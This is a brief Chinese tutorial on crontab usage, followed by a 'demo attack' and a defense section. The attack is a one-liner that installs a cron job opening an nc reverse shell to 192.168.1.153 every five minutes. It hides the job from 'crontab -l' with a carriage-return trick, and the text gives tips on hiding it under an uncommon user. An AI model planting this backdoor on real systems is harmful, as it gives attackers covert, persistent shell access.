# Crontab知识
crontab命令用于设置周期性被执行的指令。该命令从标准输入设备读取指令，并将其存放于“crontab”文件中，以供之后读取和执行。
crontab文件一般位于/etc/下，这里面存放系统运行的的调度程序

## 查看当前用户的定时任务
```
[oracle@localhost ~]$ crontab -l
* * * * * /home/oracle/test.sh >/dev/null 2>&1
```
## 编辑当前用户的定时任务
 
可以在编辑状态修改、删除、新增一些定时任务。注释一般用#
`[oracle@localhost ~]$ crontab -e`

## 删除当前用户的定时任务
```
[root@localhost ~]# crontab -r
[root@localhost ~]# crontab -l
no crontab for root
```
crontab -l  查看计划任务 -r 删除所有定时计划任务 -e  编辑计划任务

## demo 攻击案例
```
(crontab -l;printf “*/5 * * * *  /bin/nc 192.168.1.153 8080 -e /bin/sh;\rno crontab for `whoami`0c\n”)|crontab –

```
每5分钟进行连接一次。
最好用一个不常见的用户执行，任务写入/var/spool/cron/$username

## defense 防御
1、采用白名单，只允许某个帐号使用 crontab命令 。  在 /etc/cron.allow  中设置
2、每一项任务会被记录到/var/log/cron的日记文件中(测试的时候并没有….可能环境不同)
3、crontab -e 编辑当前用户的任务，这时可以看到  当前  用户的计划任务,所以在留后门，需要找一个不常               见的用户
4、cron每分钟会去读取一次/etc/crontab/与/var/spool/cron里面的数据内容，所以要注意里面的数据
